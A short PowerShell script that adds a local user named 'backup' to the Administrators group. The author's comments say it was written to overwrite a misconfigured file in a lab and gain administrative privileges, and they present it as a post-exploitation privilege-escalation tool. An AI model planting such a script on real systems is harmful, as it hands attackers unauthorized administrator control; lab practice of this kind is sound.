$user = "backup"
$group = "Administrators"

try {
    Add-LocalGroupMember -Group $group -Member $user
    Write-Output "User '$user' added to local Administrators group."
}
catch {
    Write-Output "Failed to add user. Error: $_"
}

#PowerShell script that adds a specified local user account to the local Administrators group on a Windows system.
#This was the script I made to overwrite a misconfigured file in a lab to gain administrative privilages via the admin group.
#This can be used in post-exploitation scenarios or administrative contexts to escalate privileges by granting a user elevated rights.
